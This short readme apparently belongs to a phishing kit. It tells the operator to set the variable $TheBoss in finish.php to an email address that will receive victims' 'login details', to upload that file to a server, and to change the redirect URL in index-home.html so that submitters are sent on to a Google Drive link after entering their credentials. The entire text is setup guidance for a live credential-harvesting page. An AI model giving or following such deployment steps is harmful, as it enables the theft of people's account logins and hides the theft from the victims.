Use notepad++ to open the files....


Open finish.php on line 5 you will see this line...
$TheBoss ="youremailhere"; 
change youremailhere to the email address you wwant the login details to be sent to
The finish.php file goes to the server you wish to use....


in the files index-home.html file on line 74 you wil see this line of code

var output = "https://drive.google.com/file/d/1WaMliLzZ5bR5HIbc8VULfwEKDAp5GBJ6/view?fbclid=IwAR1i7nEA1gqnVdRjWgF8Q5PLJ4cETHGqXJBxoiRwRP6rQAg9N4yCAG9Cxug";

this is the url the user will be redirected to once they submit the form

you can change 

https://drive.google.com/file/d/1WaMliLzZ5bR5HIbc8VULfwEKDAp5GBJ6/view?fbclid=IwAR1i7nEA1gqnVdRjWgF8Q5PLJ4cETHGqXJBxoiRwRP6rQAg9N4yCAG9Cxug

to your desired redirect url

